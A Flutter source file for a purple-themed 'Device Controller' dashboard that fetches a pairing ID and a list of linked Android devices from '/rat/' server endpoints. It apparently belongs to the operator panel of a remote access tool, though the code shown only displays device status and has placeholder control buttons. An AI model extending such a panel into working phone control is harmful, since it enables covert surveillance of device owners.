// device_dashboard.dart - MILKY GLOW PURPLE
import 'package:flutter/material.dart';
import 'package:flutter/services.dart';
import 'dart:convert';
import 'dart:async';
import 'package:http/http.dart' as http;

// Import dari dashboard dan api_config
import 'dashboard_page.dart';
import 'color_theme.dart';
import 'config.dart'; // Perbaiki import yang kosong

class DeviceDashboard extends StatefulWidget {
  final String username;
  final String role;
  final String sessionKey;

  DeviceDashboard({
    super.key,
    this.username = '',
    this.role = '',
    required this.sessionKey,
  });

  @override
  State<DeviceDashboard> createState() => _DeviceDashboardState();
}

class _DeviceDashboardState extends State<DeviceDashboard> {
  // ── Theme color getters ──
  Color get bgDark => AppThemeController.instance.theme.bgDark;
  Color get primaryPurple => AppThemeController.instance.theme.primaryPurple;
  Color get accentPurple => AppThemeController.instance.theme.accentPurple;
  Color get lightPurple => AppThemeController.instance.theme.lightPurple;
  Color get glowMagenta => AppThemeController.instance.theme.glowMagenta;
  Color get glowIndigo => AppThemeController.instance.theme.glowIndigo;
  Color get accentGrey => AppThemeController.instance.theme.accentGrey;
  Color get cardGlass => AppThemeController.instance.theme.cardGlass;
  Color get borderGlass => AppThemeController.instance.theme.borderGlass;

  // ─── WARNA MILKY GLOW PURPLE ──────────────────────────────
  final Color primaryWhite = Colors.white;

  List<dynamic> _devices = [];
  bool _loading = true;
  String? _errorMsg;
  String _pairId = '';
  Timer? _timer;

  @override
  void initState() {
    super.initState();
    AppThemeController.instance.addListener(_onThemeChanged);
    _loadDevices();
    _timer = Timer.periodic(Duration(seconds: 15), (_) => _loadDevices());
  }

  @override

  void _onThemeChanged() => mounted ? setState(() {}) : null;
  void dispose() {
    _timer?.cancel();
    AppThemeController.instance.removeListener(_onThemeChanged);
    super.dispose();
  }

  Future<void> _loadDevices() async {
    setState(() {
      _loading = true;
      _errorMsg = null;
    });

    try {
      final pRes = await http
          .get(Uri.parse('$apiBaseUrl/rat/pairid?key=${widget.sessionKey}'))
          .timeout(const Duration(seconds: 8));

      if (pRes.statusCode == 200 && mounted) {
        final pd = jsonDecode(pRes.body);
        if (pd['valid'] == true && pd['pairId'] != null) {
          setState(() => _pairId = pd['pairId'].toString());
        }
      }

      final dRes = await http
          .get(Uri.parse('$apiBaseUrl/rat/my-devices?key=${widget.sessionKey}'))
          .timeout(const Duration(seconds: 10));

      if (!mounted) return;

      if (dRes.statusCode != 200) {
        setState(() {
          _loading = false;
          _errorMsg = 'Server error: ${dRes.statusCode}';
        });
        return;
      }

      final body = jsonDecode(dRes.body);

      if (body['valid'] != true) {
        setState(() {
          _loading = false;
          _errorMsg = body['message'] ?? 'Invalid response';
        });
        return;
      }

      List<dynamic> devices = List<dynamic>.from(body['devices'] ?? []);

      final now = DateTime.now();
      for (var d in devices) {
        try {
          final seen = DateTime.parse(d['lastSeen']?.toString() ?? '');
          d['online'] = now.difference(seen).inSeconds < 30;
        } catch (_) {
          d['online'] = false;
        }
      }

      setState(() {
        _devices = devices;
        _loading = false;
        if (devices.isEmpty) {
          _errorMsg = 'Belum ada device yang terhubung';
        }
      });
    } catch (e) {
      if (mounted) {
        setState(() {
          _loading = false;
          _errorMsg = 'Koneksi terputus: ${e.toString()}';
        });
      }
    }
  }

  void _copyPairId() {
    if (_pairId.isEmpty) return;
    Clipboard.setData(ClipboardData(text: _pairId));
    ScaffoldMessenger.of(context).showSnackBar(
      SnackBar(
        content: Text('Pair ID disalin', style: TextStyle(color: primaryWhite)),
        backgroundColor: cardGlass,
        duration: Duration(seconds: 2),
      ),
    );
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      backgroundColor: bgDark,
      body: Container(
        decoration: BoxDecoration(
          gradient: RadialGradient(
            center: Alignment.topCenter,
            radius: 1.5,
            colors: [glowIndigo.withOpacity(0.3), bgDark],
          ),
        ),
        child: SafeArea(
          child: Column(
            children: [
              _buildHeader(),
              Expanded(
                child: SingleChildScrollView(
                  padding: const EdgeInsets.all(16),
                  child: Column(
                    children: [
                      _buildStatsCard(),
                      SizedBox(height: 16),
                      if (_pairId.isNotEmpty) _buildPairIdCard(),
                      SizedBox(height: 16),
                      if (_errorMsg != null) _buildErrorBanner(),
                      if (_loading)
                        Center(
                          child: Padding(
                            padding: const EdgeInsets.all(32),
                            child: CircularProgressIndicator(
                              color: accentPurple,
                            ),
                          ),
                        )
                      else if (_devices.isEmpty)
                        _buildEmptyState()
                      else
                        ..._devices.map((device) => _buildDeviceCard(device)),
                    ],
                  ),
                ),
              ),
            ],
          ),
        ),
      ),
    );
  }

  Widget _buildHeader() {
    return Container(
      margin: const EdgeInsets.all(16),
      padding: const EdgeInsets.symmetric(horizontal: 20, vertical: 16),
      decoration: BoxDecoration(
        color: cardGlass,
        borderRadius: BorderRadius.circular(20),
        border: Border.all(color: borderGlass),
        boxShadow: [
          BoxShadow(
            color: primaryPurple.withOpacity(0.1),
            blurRadius: 15,
            offset: Offset(0, 4),
          ),
        ],
      ),
      child: Row(
        children: [
          Container(
            padding: const EdgeInsets.all(10),
            decoration: BoxDecoration(
              gradient: LinearGradient(
                colors: [primaryPurple, accentPurple],
                begin: Alignment.topLeft,
                end: Alignment.bottomRight,
              ),
              borderRadius: BorderRadius.circular(12),
            ),
            child: Icon(Icons.devices, color: Colors.white, size: 20),
          ),
          SizedBox(width: 12),
          Expanded(
            child: Column(
              crossAxisAlignment: CrossAxisAlignment.start,
              children: [
                Text(
                  'DEVICE CONTROLLER',
                  style: TextStyle(
                    color: accentGrey,
                    fontSize: 10,
                    fontFamily: 'Orbitron',
                    letterSpacing: 1,
                  ),
                ),
                Text(
                  widget.role.toUpperCase(),
                  style: TextStyle(
                    color: primaryPurple,
                    fontSize: 12,
                    fontFamily: 'Orbitron',
                    letterSpacing: 1,
                  ),
                ),
              ],
            ),
          ),
          Container(
            padding: EdgeInsets.symmetric(horizontal: 12, vertical: 6),
            decoration: BoxDecoration(
              color: glowMagenta.withOpacity(0.1),
              borderRadius: BorderRadius.circular(20),
              border: Border.all(color: glowMagenta.withOpacity(0.3)),
            ),
            child: Row(
              children: [
                Icon(Icons.wifi, color: glowMagenta, size: 12),
                SizedBox(width: 6),
                Text(
                  'Sistem Aktif',
                  style: TextStyle(
                    fontSize: 10,
                    color: AppThemeController.instance.glowMagenta,
                    fontFamily: 'ShareTechMono',
                  ),
                ),
              ],
            ),
          ),
        ],
      ),
    );
  }

  Widget _buildStatsCard() {
    int online = _devices.where((d) => d['online'] == true).length;
    return Container(
      padding: const EdgeInsets.all(16),
      decoration: BoxDecoration(
        color: cardGlass,
        borderRadius: BorderRadius.circular(20),
        border: Border.all(color: borderGlass),
      ),
      child: Row(
        children: [
          _buildStat('TOTAL', _devices.length.toString(), primaryPurple),
          SizedBox(width: 12),
          _buildStat('ONLINE', online.toString(), glowMagenta),
          SizedBox(width: 12),
          _buildStat('OFFLINE', (_devices.length - online).toString(), accentPurple),
        ],
      ),
    );
  }

  Widget _buildStat(String label, String value, Color color) {
    return Expanded(
      child: Container(
        padding: const EdgeInsets.symmetric(vertical: 12),
        decoration: BoxDecoration(
          gradient: LinearGradient(
            colors: [color.withOpacity(0.15), color.withOpacity(0.05)],
          ),
          borderRadius: BorderRadius.circular(12),
        ),
        child: Column(
          children: [
            Text(
              label,
              style: TextStyle(
                color: accentGrey,
                fontSize: 10,
                fontFamily: 'Orbitron',
                letterSpacing: 1,
              ),
            ),
            SizedBox(height: 4),
            Text(
              value,
              style: TextStyle(
                color: color,
                fontSize: 24,
                fontWeight: FontWeight.bold,
                fontFamily: 'Orbitron',
              ),
            ),
          ],
        ),
      ),
    );
  }

  Widget _buildPairIdCard() {
    return GestureDetector(
      onTap: _copyPairId,
      child: Container(
        padding: const EdgeInsets.all(12),
        decoration: BoxDecoration(
          gradient: LinearGradient(
            colors: [primaryPurple.withOpacity(0.15), primaryPurple.withOpacity(0.05)],
          ),
          borderRadius: BorderRadius.circular(12),
          border: Border.all(color: primaryPurple.withOpacity(0.3)),
        ),
        child: Row(
          children: [
            Icon(Icons.link, color: accentPurple),
            SizedBox(width: 12),
            Expanded(
              child: Column(
                crossAxisAlignment: CrossAxisAlignment.start,
                children: [
                  Text(
                    'PAIRING ID',
                    style: TextStyle(
                      color: accentGrey,
                      fontSize: 9,
                      fontFamily: 'Orbitron',
                      letterSpacing: 1,
                    ),
                  ),
                  Text(
                    _pairId,
                    style: TextStyle(
                      color: accentPurple,
                      fontFamily: 'monospace',
                      fontSize: 13,
                    ),
                  ),
                ],
              ),
            ),
            Container(
              padding: const EdgeInsets.symmetric(horizontal: 10, vertical: 6),
              decoration: BoxDecoration(
                color: accentPurple.withOpacity(0.15),
                borderRadius: BorderRadius.circular(8),
              ),
              child: Row(
                children: [
                  Icon(Icons.copy, color: accentPurple, size: 14),
                  SizedBox(width: 4),
                  Text(
                    'SALIN',
                    style: TextStyle(
                      fontSize: 9,
                      color: accentPurple,
                      fontFamily: 'Orbitron',
                    ),
                  ),
                ],
              ),
            ),
          ],
        ),
      ),
    );
  }

  Widget _buildErrorBanner() {
    return Container(
      margin: const EdgeInsets.only(bottom: 16),
      padding: const EdgeInsets.all(12),
      decoration: BoxDecoration(
        color: Colors.red.withOpacity(0.1),
        borderRadius: BorderRadius.circular(12),
        border: Border.all(color: Colors.red.withOpacity(0.3)),
      ),
      child: Row(
        children: [
          Icon(Icons.error_outline, color: Colors.red, size: 18),
          SizedBox(width: 12),
          Expanded(
            child: Text(
              _errorMsg!,
              style: TextStyle(
                color: Colors.red,
                fontSize: 11,
                fontFamily: 'ShareTechMono',
              ),
            ),
          ),
        ],
      ),
    );
  }

  Widget _buildEmptyState() {
    return Container(
      padding: const EdgeInsets.all(40),
      decoration: BoxDecoration(
        color: cardGlass,
        borderRadius: BorderRadius.circular(24),
        border: Border.all(color: borderGlass),
      ),
      child: Column(
        children: [
          Icon(Icons.devices, color: accentGrey, size: 64),
          SizedBox(height: 16),
          Text(
            'BELUM ADA DEVICE',
            style: TextStyle(
              fontSize: 14,
              fontWeight: FontWeight.bold,
              fontFamily: 'Orbitron',
              letterSpacing: 1,
              color: Colors.white,
            ),
          ),
          SizedBox(height: 8),
          Text(
            'Gunakan Pair ID untuk menghubungkan device Android',
            style: TextStyle(
              fontSize: 11,
              color: accentGrey,
              fontFamily: 'ShareTechMono',
            ),
          ),
        ],
      ),
    );
  }

  Widget _buildDeviceCard(Map<String, dynamic> device) {
    final bool isOnline = device['online'] == true;
    final String deviceName = device['model'] ?? 'Unknown Device';
    final int battery = device['battery'] ?? 0;

    return Container(
      margin: const EdgeInsets.only(bottom: 12),
      decoration: BoxDecoration(
        color: cardGlass,
        borderRadius: BorderRadius.circular(20),
        border: Border.all(
          color: isOnline ? accentPurple.withOpacity(0.3) : borderGlass,
        ),
        boxShadow: isOnline
            ? [
                BoxShadow(
                  color: primaryPurple.withOpacity(0.1),
                  blurRadius: 10,
                  offset: Offset(0, 4),
                ),
              ]
            : null,
      ),
      child: ListTile(
        contentPadding: const EdgeInsets.all(16),
        leading: Stack(
          children: [
            Container(
              width: 56,
              height: 56,
              decoration: BoxDecoration(
                color: cardGlass,
                borderRadius: BorderRadius.circular(16),
                border: Border.all(color: borderGlass),
              ),
              child: Icon(
                Icons.phone_android,
                color: isOnline ? accentPurple : accentGrey,
                size: 28,
              ),
            ),
            Positioned(
              bottom: 4,
              right: 4,
              child: Container(
                width: 10,
                height: 10,
                decoration: BoxDecoration(
                  shape: BoxShape.circle,
                  color: isOnline ? glowMagenta : accentPurple,
                ),
              ),
            ),
          ],
        ),
        title: Text(
          deviceName,
          style: TextStyle(
            color: primaryWhite,
            fontWeight: FontWeight.bold,
            fontFamily: 'Orbitron',
            fontSize: 14,
          ),
        ),
        subtitle: Row(
          children: [
            Icon(Icons.battery_charging_full, color: accentGrey, size: 12),
            SizedBox(width: 4),
            Text(
              '$battery%',
              style: TextStyle(color: accentGrey, fontSize: 11, fontFamily: 'ShareTechMono'),
            ),
            SizedBox(width: 12),
            Container(
              width: 6,
              height: 6,
              decoration: BoxDecoration(
                shape: BoxShape.circle,
                color: isOnline ? glowMagenta : accentPurple,
              ),
            ),
            SizedBox(width: 6),
            Text(
              isOnline ? 'Online' : 'Offline',
              style: TextStyle(
                color: isOnline ? glowMagenta : accentPurple,
                fontSize: 11,
                fontFamily: 'ShareTechMono',
                fontWeight: FontWeight.w500,
              ),
            ),
          ],
        ),
        trailing: Row(
          mainAxisSize: MainAxisSize.min,
          children: [
            IconButton(
              icon: Icon(Icons.tune, color: primaryPurple),
              onPressed: () => ScaffoldMessenger.of(context).showSnackBar(
                SnackBar(
                  content: Text('Control panel coming soon', style: TextStyle(color: primaryWhite)),
                  backgroundColor: cardGlass,
                ),
              ),
            ),
            IconButton(
              icon: Icon(Icons.delete, color: accentPurple),
              onPressed: () => ScaffoldMessenger.of(context).showSnackBar(
                SnackBar(
                  content: Text('Delete device coming soon', style: TextStyle(color: primaryWhite)),
                  backgroundColor: cardGlass,
                ),
              ),
            ),
          ],
        ),
      ),
    );
  }
}